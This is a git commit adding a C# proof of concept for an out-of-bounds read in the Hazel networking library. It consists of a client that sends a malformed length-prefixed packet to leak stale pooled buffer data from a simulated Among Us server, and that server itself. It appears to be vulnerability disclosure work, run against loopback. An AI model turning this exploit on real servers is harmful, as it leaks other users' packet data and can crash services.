81960bc0bcc639a29d21a7c5d27d914fdbc30c3a
pixelomer <37103802+pixelomer@users.noreply.github.com>
2020-10-07 22:33:35 +0300

    Initial commit

---
+++ client.cs
@@ -0,0 +1,106 @@
+﻿using System;
+using System.Net;
+using System.Text;
+using System.Threading;
+using Hazel;
+
+namespace HazelTestClient
+{
+    class Program
+    {
+        static Hazel.Udp.UdpClientConnection connection;
+
+        static void Main(string[] args)
+        {
+            connection = new Hazel.Udp.UdpClientConnection(new IPEndPoint(IPAddress.Loopback, 22023));
+            connection.DataReceived += HandleNewData;
+            connection.Connect();
+            if (connection.State != Hazel.ConnectionState.Connected)
+            {
+                Console.WriteLine("Couldn't connect");
+            }
+            else
+            {
+                // Malicious echo packet loop
+                MessageWriter writer = MessageWriter.Get(SendOption.None);
+                writer.StartMessage(0x7F);
+
+                // THE BUG
+                //
+                // No bound checks. When the server wants to read a string from
+                // an offset, it reads the packed int at that offset, treats it
+                // as a length and then proceeds to read the data that comes after
+                // it without any bound checks. This can be chained with something
+                // else to create an infoleak like this PoC. This can also be used
+                // to cause an exception to be thrown in the server by specifying a
+                // very large number.
+                //
+                // This PoC might seem unrealistic. However, this PoC is based on the
+                // behaviour of the Among Us server. When an invalid name is sent to
+                // the server, it echoes it back to the client. This can be chained
+                // with this bug to leak old packets from the server.
+                //
+                // The line below will add 1 byte to the packet. However, the server
+                // will treat this byte as length, and it will proceed to read 0x50
+                // more bytes.
+                //
+                writer.WritePacked(0x50);
+
+                writer.EndMessage();
+                while (true)
+                {
+                    connection.Send(writer);
+                    Thread.Sleep(1000);
+                    if (connection.State != Hazel.ConnectionState.Connected)
+                    {
+                        Console.WriteLine("Connection closed.");
+                        break;
+                    }
+                }
+                writer.Recycle();
+            }
+            Console.Write("Press any key to exit... ");
+            Console.ReadKey();
+        }
+
+        // This code generates a hexdump, nothing malicious here.
+        // If this function is executed, this means the exploit was
+        // successful.
+        static void HandleNewData(DataReceivedEventArgs args)
+        {
+            Console.WriteLine("Received new data!");
+            string output = args.Message.ReadMessage().ReadString();
+            byte[] byteArray = Encoding.ASCII.GetBytes(output);
+            for (int i = 0; i < byteArray.Length; i += 16)
+            {
+                int writeCounter = 0;
+                for (int j = i; j < i + 16 && j < byteArray.Length; j++)
+                {
+                    byte byteValue = Convert.ToByte(byteArray[j]);
+                    if (byteValue < 0x10)
+                    {
+                        Console.Write("0");
+                    }
+                    Console.Write($"{byteValue.ToString("x")} ");
+                    writeCounter += 3;
+                }
+
+                while (writeCounter++ < 50)
+                {
+                    Console.Write(" ");
+                }
+
+                for (int j = i; j < i + 16 && j < byteArray.Length; j++)
+                {
+                    byte byteValue = Convert.ToByte(byteArray[j]);
+                    if ((byteValue < ' ') || (byteValue > '~')) {
+                        byteValue = Convert.ToByte('.');
+                    }
+                    Console.Write(Convert.ToChar(byteValue));
+                }
+
+                Console.Write("\n");
+            }
+        }
+    }
+}
---
+++ server.cs
@@ -0,0 +1,87 @@
+﻿using System;
+using Hazel.Udp.FewerThreads;
+using Hazel;
+using System.Net;
+using System.Threading;
+using System.Collections.Generic;
+
+namespace HazelTestServer
+{
+    class Program
+    {
+
+        static void Main(string[] args)
+        {
+            //
+            // There isn't really a bug in the MessageReader.GetSized() function.
+            // However, when you are able to read data out of bounds, it causes
+            // problems. MessageReader.GetSized() returns a reader from a reader
+            // pool, and it does not empty the buffer of the reader before returning
+            // it. This means that there will still be left-overs from previous
+            // packets. This is what the client leaks.
+            //
+            {
+                const int readerCount = 10;
+                List<MessageReader> readers = new List<MessageReader>(readerCount);
+                Random generator = new Random();
+                for (int i = 0; i < readerCount; i++)
+                {
+                    MessageReader reader = MessageReader.GetSized(0x10000);
+                    for (int j = 0; j < 0x10000; j++)
+                    {
+                        reader.Buffer[j] = Convert.ToByte(generator.Next(0xFF));
+                    }
+                    readers.Add(reader);
+                }
+                foreach (MessageReader reader in readers)
+                {
+                    reader.Recycle();
+                }
+            }
+
+            using (var udpServer = new ThreadLimitedUdpConnectionListener(8, new IPEndPoint(IPAddress.Loopback, 22023), null, IPMode.IPv4))
+            {
+                udpServer.NewConnection += HandleNewConnection;
+                udpServer.Start();
+                Console.WriteLine("Listening to new connections...");
+                while (true)
+                {
+                    Thread.Sleep(60000);
+                }
+            }
+        }
+
+        static void HandleNewConnection(NewConnectionEventArgs args)
+        {
+            Console.WriteLine("New connection");
+            args.Connection.DataReceived += HandleNewMessage;
+        }
+
+        static unsafe void HandleNewMessage(DataReceivedEventArgs args)
+        {
+            MessageReader reader = args.Message.ReadMessage();
+            try
+            {
+                Console.WriteLine("New message");
+
+                // Simulate the Among Us server response
+                string input = $"Inappropriate name: {reader.ReadString()}";
+                MessageWriter writer = MessageWriter.Get(SendOption.None);
+                writer.StartMessage(reader.Tag);
+                writer.Write(input);
+                writer.EndMessage();
+                args.Sender.Send(writer);
+                writer.Recycle();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+            finally
+            {
+                reader.Recycle();
+                args.Message.Recycle();
+            }
+        }
+    }
+}
